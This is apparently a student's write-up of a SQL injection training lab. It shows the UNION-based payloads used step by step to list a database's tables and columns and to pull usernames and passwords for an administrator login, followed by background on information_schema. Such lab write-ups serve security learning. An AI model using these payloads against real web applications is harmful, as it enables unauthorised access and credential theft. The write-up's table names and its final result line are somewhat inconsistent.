# Lab 05: Examining the database schema in SQL injection attacks

## Category
SQL Injection - Union Attack

## Objective
perform a SQL injection UNION attack to identify the database Schema.

## Solution
 
1. Use Burp Suite to intercept and modify the request that sets the product category filter.

2. Determine the number of columns that are being returned by the query and which columns contain text data. 

3. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
``  
'+UNION+SELECT+'abc','def'--
``  

4. Use the following payload to retrieve the list of tables in the database, we can also add a text to identify the vulnerability and help us search for the result:
``  
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
``  
here we can see that there are multible tables start with pg_ which suggest it is a postgerSQL database. We are particularly interested in finding the user table to retirve administrator credentials, let's see how to do that.

5. Find the name of the table containing user credentials.
Use the following payload to retrieve the details of the columns in the table:
``  
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ebgdei'--
``  
6. Find the names of the columns containing usernames and passwords.
Use the following payload to retrieve the usernames and passwords for all users:
``  
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
``  
7. Find the password for the administrator user, and use it to log in.
8. Congratulation! We logged in successfully.

## A bit of theory  
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query information_schema.tables to list the tables in the database:
``  
SELECT * FROM information_schema.tables
``  
This returns output like the following:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
|---------------|--------------|------------|------------|
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
``  
SELECT * FROM information_schema.columns WHERE table_name = 'Users' ``  
This returns output like the following:
### Users Table Columns

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|---------------|--------------|------------|-------------|-----------|
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |

This output shows the columns in the `Users` table and the data type of each column.
## What I Learned
- Use Burp Suite to intercept and modify the login request.
- Modify the category parameter, using Burp Suite Repeater.
- Apply SQL injection UNION attacks.
- Determine the number of columns required.
- Find columns with a useful data type.
- Use a SQL injection UNION attack to retrieve the database schema and content. 


## Tools
- Burp Suite
- Browser

## Result
✅ Retrieve the type and version of the database software.  
✅ Lab solved successfully

